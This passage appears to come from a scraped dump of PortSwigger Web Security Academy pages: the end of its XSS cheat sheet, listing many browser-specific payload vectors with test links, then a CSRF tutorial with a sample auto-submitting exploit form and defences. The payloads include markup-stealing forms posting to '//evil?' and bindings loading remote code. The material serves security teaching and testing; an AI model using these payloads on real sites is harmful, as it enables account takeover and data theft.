formaction=x><b>stealme`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cbutton%20name%3Dx%20formaction%3Dx%3E%3Cb%3Estealme&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#button-used-to-consume-markup)\n\nIE9 select elements and plaintext used to consume markup\n\n[`<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=\"supersecret\"</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20action%3Dx%3E%3Cbutton%3EXSS%3C%2Fbutton%3E%3Cselect%20name%3Dx%3E%3Coption%3E%3Cplaintext%3E%3Cscript%3Etoken%3D%22supersecret%22%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ie9-select-elements-and-plaintext-used-to-consume-markup)\n\nXBL Firefox only <\\= 2\n\n[``` <div style=\"-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\"> <div style=\"\\-\\mo\\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\"> <div style=\"-moz-bindin\\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\"> <div style=\"-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\"> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cdiv%20style%3D%22-moz-binding%3Aurl%28%2F%2Fbusinessinfo.co.uk%2Flabs%2Fxbl%2Fxbl.xml%23xss%29%22%3E%0A%3Cdiv%20style%3D%22%5C-%5Cmo%5Cz-binding%3Aurl%28%2F%2Fbusinessinfo.co.uk%2Flabs%2Fxbl%2Fxbl.xml%23xss%29%22%3E%0A%3Cdiv%20style%3D%22-moz-bindin%5C67%3Aurl%28%2F%2Fbusinessinfo.co.uk%2Flab%20s%2Fxbl%2Fxbl.xml%23xss%29%22%3E%0A%3Cdiv%20style%3D%22-moz-bindin%26%23x5c%3B67%3Aurl%28%2F%2Fbusinessinfo.co.uk%2Flab%20s%2Fxbl%2Fxbl.xml%23xss%29%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xbl-firefox-only--2)\n\nXBL also worked in FF3.5 using data urls\n\n[`<img src=\"blah\" style=\"-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)\" />`](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%3D%22blah%22%20style%3D%22-moz-binding%3A%20url%28data%3Atext%2Fxml%3Bcharset%3Dutf-8%2C%253C%253Fxml%2520version%253D%25221.0%2522%253F%253E%253Cbindings%2520xmlns%253D%2522%20http%253A%2F%2Fwww.mozilla.org%2Fxbl%2522%253E%253Cbinding%2520id%253D%2522loader%2522%253E%253Cimplementation%253E%253Cconstructor%253E%253C%2521%255BCDATA%255Bvar%2520url%2520%253D%2520%2522alert.js%20%2522%253B%2520var%2520scr%2520%253D%2520document.createElement%2528%2522script%2522%2529%253B%2520scr.setAttribute%2528%2522src%2522%252Curl%2529%253B%2520var%2520bodyElement%2520%253D%2520%20document.getElementsByTagName%2528%2522html%2522%2529.item%25280%2529%253B%2520bodyElement.appendChild%2528scr%2529%253B%2520%255D%255D%253E%253C%2Fconstructor%253E%253C%2Fimplementation%253E%253C%2F%20binding%253E%253C%2Fbindings%253E%29%22%20%2F%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xbl-also-worked-in-ff35-using-data-urls)\n\nCSS expressions <\\=IE7\n\n[``` <div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\\6e(alert(1))> <div style=xss:expressio\\006e(alert(1))> <div style=xss:expressio\\00006e(alert(1))> <div style=xss:expressio\\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cdiv%20style%3Dxss%3Aexpression%28alert%281%29%29%3E%0A%3Cdiv%20style%3Dxss%3Aexpression%281%29-alert%281%29%3E%0A%3Cdiv%20style%3Dxss%3Aexpressio%5C6e%28alert%281%29%29%3E%0A%3Cdiv%20style%3Dxss%3Aexpressio%5C006e%28alert%281%29%29%3E%0A%3Cdiv%20style%3Dxss%3Aexpressio%5C00006e%28alert%281%29%29%3E%0A%3Cdiv%20style%3Dxss%3Aexpressio%5C6e%28alert%281%29%29%3E%0A%3Cdiv%20style%3Dxss%3Aexpressio%26%23x5c%3B6e%28alert%281%29%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#css-expressions-ie7)\n\nIn quirks mode IE allowed you to use = instead of :\n\n[``` <div style=xss=expression(alert(1))> <div style=\"color&#x3dred\">test</div> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cdiv%20style%3Dxss%3Dexpression%28alert%281%29%29%3E%0A%3Cdiv%20style%3D%22color%26%23x3dred%22%3Etest%3C%2Fdiv%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#in-quirks-mode-ie-allowed-you-to-use--instead-of-)\n\nBehaviors for older modes of IE\n\n[`<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20style%3D%22behavior%3Aurl%28%23default%23AnchorClick%29%3B%22%20folder%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#behaviors-for-older-modes-of-ie)\n\nOlder versions of IE supported event handlers in functions\n\n[``` <script> function window.onload(){ alert(1); } </script> <script> function window::onload(){ alert(1); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; } </script> </body> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%0Afunction%20window.onload%28%29%7B%0Aalert%281%29%3B%0A%7D%0A%3C%2Fscript%3E%0A%3Cscript%3E%0Afunction%20window%3A%3Aonload%28%29%7B%0Aalert%281%29%3B%0A%7D%0A%3C%2Fscript%3E%0A%3Cscript%3E%0Afunction%20window.location%28%29%7B%0A%7D%0A%3C%2Fscript%3E%0A%3Cbody%3E%0A%3Cscript%3E%0Afunction%2F%2A%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E%2A%2Fdocument.body.innerHTML%28%29%7B%7D%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3Cbody%3E%0A%3Cscript%3E%0Afunction%20document.body.innerHTML%28%29%7B%20x%20%3D%20%22%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E%22%3B%20%7D%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#older-versions-of-ie-supported-event-handlers-in-functions)\n\nGreyMagic HTML+time exploit (no longer works even in 5 docmode)\n\n[`<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> </BODY></HTML>`](https://portswigger-labs.net/xss/xss.php?x=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace%20prefix%3D%22t%22%20ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset%20attributeName%3D%22innerHTML%22%20to%3D%22XSS%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E%22%3E%20%3C%2FBODY%3E%3C%2FHTML%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#greymagic-htmltime-exploit-no-longer-works-even-in-5-docmode)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nFirefox allows NULLS after &\n\n[`<a href=\"javascript&#x6a;avascript:alert(1)\">Firefox</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%26%00%23x6a%3Bavascript%3Aalert%281%29%22%3EFirefox%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#firefox-allows-nulls-after-)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nFirefox allows NULLs inside named entities\n\n[`<a href=\"javascript&colon;alert(1)\">Firefox</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%26%00colon%00%3Balert%281%29%22%3EFirefox%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#firefox-allows-nulls-inside-named-entities)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nFirefox allows NULL characters inside opening comments\n\n[``` <!-- ><img title=\"--><iframe/onload=alert(1)>\"> --> <!-- ><img title=\"--><iframe/onload=alert(1)>\"> --> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21-%00-%20%3E%3Cimg%20title%3D%22--%3E%3Ciframe%2Fonload%3Dalert%281%29%3E%22%3E%20--%3E%0A%3C%21-%00%00%00%00%00-%20%3E%3Cimg%20title%3D%22--%3E%3Ciframe%2Fonload%3Dalert%281%29%3E%22%3E%20--%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#firefox-allows-null-characters-inside-opening-comments)\n\n![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSafari used to allow any tag to have a onload event inside SVG\n\n[`<svg><xss onload=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cxss%20onload%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#safari-used-to-allow-any-tag-to-have-a-onload-event-inside-svg)\n\nIsindex using src attribute\n\n[`<isindex type=image src=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cisindex%20type%3Dimage%20src%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#isindex-using-src-attribute)\n\nIsindex using submit\n\n[`<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"//evil?`](https://portswigger-labs.net/xss/xss.php?x=%3Cisindex%20type%3Dsubmit%20style%3Dwidth%3A100%25%3Bheight%3A100%25%3B%20value%3DXSS%20formaction%3D%22%2F%2Fevil%3F&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#isindex-using-submit)\n\nIsindex and formaction\n\n[`<isindex type=submit formaction=javascript:alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cisindex%20type%3Dsubmit%20formaction%3Djavascript%3Aalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#isindex-and-formaction)\n\nIsindex and action\n\n[`<isindex type=submit action=javascript:alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cisindex%20type%3Dsubmit%20action%3Djavascript%3Aalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#isindex-and-action)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\ndiscard tag and onbegin\n\n[`<svg><discard onbegin=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cdiscard%20onbegin%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#discard-tag-and-onbegin)\n\nUse element with an external URL\n\n[`<svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>`](http://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cuse%20href%3D%22%2F%2Fsubdomain1.portswigger-labs.net%2Fuse_element%2Fupload.php%23x%22%20%2F%3E%3C%2Fsvg%3E&context=html&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#use-element-with-an-external-url)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nonloadstart event for media elements in Firefox v107 and below\n\n[`<img src=validimage.png onloadstart=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%3Dvalidimage.png%20onloadstart%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onloadstart-event-for-media-elements-in-firefox-v107-and-below)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nonloadend event for media elements in Firefox v107 and below\n\n[`<input type=image onloadend=alert(1) src=validimage.png>`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20type%3Dimage%20onloadend%3Dalert%281%29%20src%3Dvalidimage.png%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onloadend-event-for-media-elements-in-firefox-v107-and-below)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nonbounce event for marquee element in Firefox v125 and below\n\n[`<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>`](https://portswigger-labs.net/xss/xss.php?x=%3Cmarquee%20width%3D1%20loop%3D1%20onbounce%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbounce-event-for-marquee-element-in-firefox-v125-and-below)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nonfinish event for marquee element in Firefox v125 and below\n\n[`<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>`](https://portswigger-labs.net/xss/xss.php?x=%3Cmarquee%20width%3D1%20loop%3D1%20onfinish%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfinish-event-for-marquee-element-in-firefox-v125-and-below)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nonstart event for marquee element in Firefox v125 and below\n\n[`<marquee onstart=alert(1)>XSS</marquee>`](https://portswigger-labs.net/xss/xss.php?x=%3Cmarquee%20onstart%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onstart-event-for-marquee-element-in-firefox-v125-and-below)\n\nCredits\n\nBrought to you by [PortSwigger Research](https://portswigger.net/research). Created by [@garethheyes](https://twitter.com/garethheyes).\n\nThis cheat sheet wouldn't be possible without the web security community who share their research. Big thanks to: [James Kettle](https://twitter.com/albinowax), [Mario Heiderich](https://twitter.com/cure53berlin), [Eduardo Vela](https://twitter.com/sirdarckcat), [Masato Kinugawa](https://twitter.com/kinugawamasato), [Filedescriptor](https://twitter.com/filedescriptor), LeverOne, [Ben Hayak](https://twitter.com/BenHayak), [Alex Inf\u00fchr](https://twitter.com/insertScript), [Mathias Karlsson](https://twitter.com/avlidienbrunn), [Jann Horn](https://twitter.com/tehjh), [Ian Hickey](https://twitter.com/ianhickey1024), [G\u00e1bor Moln\u00e1r](https://twitter.com/molnar_g), [tsetnep](https://twitter.com/tsetnep), Psych0tr1a, Skyphire, [Abdulrhman Alqabandi](https://twitter.com/Qab), brainpillow, Kyo, [Yosuke Hasegawa](https://twitter.com/hasegawayosuke), White Jordan, Algol, jackmasa, wpulog, Bolk, [Robert Hansen](https://twitter.com/RSnake), [David Lindsay](https://twitter.com/thornmaker), Superhei, [Michal Zalewski](https://twitter.com/lcamtuf), Renaud Lifchitz, Roman Ivanov, [Frederik Braun](https://infosec.exchange/@freddy@security.plumbing), [Krzysztof Kotowicz](https://twitter.com/kkotowicz), [Giorgio Maone](https://twitter.com/ma1), GreyMagic, [Marcus Niemietz](https://twitter.com/mniemietz), [Soroush Dalili](https://twitter.com/irsdl), [Stefano Di Paola](https://twitter.com/WisecWisec), [Roman Shafigullin](https://twitter.com/shafigullin), [Lewis Ardern](https://twitter.com/LewisArdern), [Micha\u0142 Bentkowski](https://twitter.com/SecurityMB), [S\u00d8\u1d18\u1d00S](https://twitter.com/dsopas), [avanish46](https://twitter.com/avanish46), [Juuso K\u00e4enm\u00e4ki](https://twitter.com/jusbsec), [jinmo123](https://twitter.com/jinmo123), [itszn13](https://twitter.com/itszn13), [Martin Bajanik](https://twitter.com/_bayotop), [David Granqvist](https://twitter.com/hacker_112), [Andrea (theMiddle) Menin](https://twitter.com/AndreaTheMiddle), [simps0n](https://twitter.com/simps0n), [hahwul](https://twitter.com/hahwul), [Pawe\u0142 Ha\u0142drzy\u0144ski](https://twitter.com/phaldrzynski), [Jun Kokatsu](https://twitter.com/shhnjk), [RenwaX23](https://twitter.com/RenwaX23), [sratarun](https://twitter.com/sratarun), [har1sec](https://twitter.com/har1sec), [Yann C.](https://twitter.com/ycam_asafety), gadhiyasavan, p4fg, diofeher, [Sergey Bobrov](https://twitter.com/Black2Fan), [PwnFunction](https://twitter.com/PwnFunction), [Guilherme Keerok](https://twitter.com/k33r0k), [Alex Brasetvik](https://twitter.com/alexbrasetvik), [s1r1us](https://twitter.com/S1r1u5_), ngyikp, the-xentropy, [Rando111111](https://twitter.com/Rando02355205), [Fzs](https://stackoverflow.com/users/8376184/fzs), [Sivakumar](https://twitter.com/ladecruze), [Dwi Siswanto](https://github.com/dwisiswant0), [bxmbn](https://twitter.com/bxmbn), [Tarunkant Gupta](https://github.com/tarunkant), [Rando111111](https://github.com/Rando111111), [laytonctf](https://twitter.com/laytonctf), Begeek, Hannes Leopold, yawnmoth, yawnmoth, Yair Amit, Franz Sedlmaier, \u0141ukasz Pilorz, Steven Christey, Dan Crowley, Rene Ledosquet, Kurt Huwig, Moritz Naumann, Jonathan Vanasco, nEUrOO, Sec Consult, Timo, Ozh, [David Ross](https://twitter.com/randomdross), Lukasz Plonka (sp3x), xhzeem, [Mach1ne](https://twitter.com/h4nsmach1ne), [AmirMohammad Safari](https://x.com/amirmsafari), [Tom Schuster](https://hachyderm.io/@evilpie), [Wcraft-log](https://github.com/wcraft-log), [Filipnyquist](https://github.com/filipnyquist), [zhenwarx](https://twitter.com/zhenwarx)\n\nYou can contribute to this cheat sheet by creating a [new issue](https://github.com/PortSwigger/xss-cheatsheet-data/issues) or [updating the JSON and creating a pull request](https://github.com/PortSwigger/xss-cheatsheet-data/pulls)\n\nDownloaded from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet\n\nBurp Suite\n\n[Web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner) [Burp Suite Editions](https://portswigger.net/burp) [Release Notes](https://portswigger.net/burp/releases)\n\nVulnerabilities\n\n[Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting) [SQL injection](https://portswigger.net/web-security/sql-injection) [Cross-site request forgery](https://portswigger.net/web-security/csrf) [XML external entity injection](https://portswigger.net/web-security/xxe) [Directory traversal](https://portswigger.net/web-security/file-path-traversal) [Server-side request forgery](https://portswigger.net/web-security/ssrf)\n\nCustomers\n\n[Organizations](https://portswigger.net/organizations) [Testers](https://portswigger.net/testers) [Developers](https://portswigger.net/developers)\n\nCompany\n\n[About](https://portswigger.net/about) [Careers](https://portswigger.net/careers) [Contact](https://portswigger.net/about/contact) [Legal](https://portswigger.net/legal) [Privacy Notice](https://portswigger.net/privacy)\n\nInsights\n\n[Web Security Academy](https://portswigger.net/web-security) [Blog](https://portswigger.net/blog) [Research](https://portswigger.net/research)\n\n[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](https://portswigger.net/) [Follow us](https://twitter.com/Burp_Suite)\u00a9 2024 PortSwigger Ltd.\n\n[](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#top)\n", "category": "XSS"}, {"title": "What is CSRF?", "content": "In this section, we'll explain what cross-site request forgery is, describe some examples of common CSRF vulnerabilities, and explain how to prevent CSRF attacks.\n\nWhat is CSRF?\n-------------\n\nCross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.\n\n!\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind CSRF vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all CSRF labs](https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf)\n\nWhat is the impact of a CSRF attack?\n------------------------------------\n\nIn a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.\n\nHow does CSRF work?\n-------------------\n\nFor a CSRF attack to be possible, three key conditions must be in place:\n\n*   **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).\n*   **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.\n*   **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.\n\nFor example, suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following:\n\n```\nPOST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 30\nCookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE\n\nemail=wiener@normal-user.com\n```\n\nThis meets the conditions required for CSRF:\n\n*   The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.\n*   The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.\n*   The attacker can easily determine the values of the request parameters that are needed to perform the action.\n\nWith these conditions in place, the attacker can construct a web page containing the following HTML:\n\n```\n<html>\n    <body>\n        <form action=\"https://vulnerable-website.com/email/change\" method=\"POST\">\n            <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" />\n        </form>\n        <script>\n            document.forms[0].submit();\n        </script>\n    </body>\n</html>\n```\n\nIf a victim user visits the attacker's web page, the following will happen:\n\n*   The attacker's page will trigger an HTTP request to the vulnerable website.\n*   If the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request (assuming [SameSite cookies](https://portswigger.net/web-security/csrf#common-defences-against-csrf) are not being used).\n*   The vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.\n\n#### Note\n\nAlthough CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.\n\nHow to construct a CSRF attack\n------------------------------\n\nManually creating the HTML needed for a CSRF exploit can be cumbersome, particularly where the desired request contains a large number of parameters, or there are other quirks in the request. The easiest way to construct a CSRF exploit is using the [CSRF PoC generator](https://portswigger.net/burp/documentation/desktop/tools/engagement-tools/generate-csrf-poc) that is built in to [Burp Suite Professional](https://portswigger.net/burp/pro):\n\n*   Select a request anywhere in Burp Suite Professional that you want to test or exploit.\n*   From the right-click context menu, select Engagement tools / Generate CSRF PoC.\n*   Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).\n*   You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.\n*   Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable website, and test whether the intended request is issued successfully and the desired action occurs.\n\nHow to deliver a CSRF exploit\n-----------------------------\n\nThe delivery mechanisms for cross-site request forgery attacks are essentially the same as for [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected). Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message. Or if the attack is placed into a popular website (for example, in a user comment), they might just wait for users to visit the website.\n\nNote that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website. In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this:\n\n`<img src=\"https://vulnerable-website.com/email/change?email=pwned@evil-user.net\">`\n\nCommon defences against CSRF\n----------------------------\n\nNowadays, successfully finding and exploiting CSRF vulnerabilities often involves bypassing anti-CSRF measures deployed by the target website, the victim's browser, or both. The most common defenses you'll encounter are as follows:\n\n*   **CSRF tokens** - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.\n    \n*   **SameSite cookies** - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces `Lax` SameSite restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future.\n    \n*   **Referer-based validation** - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.\n    \n\nFor a more detailed description of each of these defenses, as well as how they can potentially be bypassed, check out the following materials. These include interactive labs that let you practice what you've learned on realistic, deliberately vulnerable targets.\n\n#### Read more\n\n*   [LABS Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)\n*   [LABS Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)\n*   [LABS Bypassing Referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)\n\nFor details on how to properly implement these defenses in order to prevent some of these issues on your own websites, see [How to prevent CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing)\n", "category": "CSRF"}, {"title": "XSS vs CSRF", "content": "### Cross-site request forgery (CSRF)\n\n*   [What is CSRF?](https://portswigger.net/web-security/csrf#what-is-csrf)\n*   [Impact](https://portswigger.net/web-security/csrf#what-is-the-impact-of-a-csrf-attack)\n*   [How does CSRF work?](https://portswigger.net/web-security/csrf#how-does-csrf-work)\n*    [XSS vs CSRF](https://portswigger.net/web-security/csrf/xss-vs-csrf)\n    *   [Can CSRF tokens prevent XSS 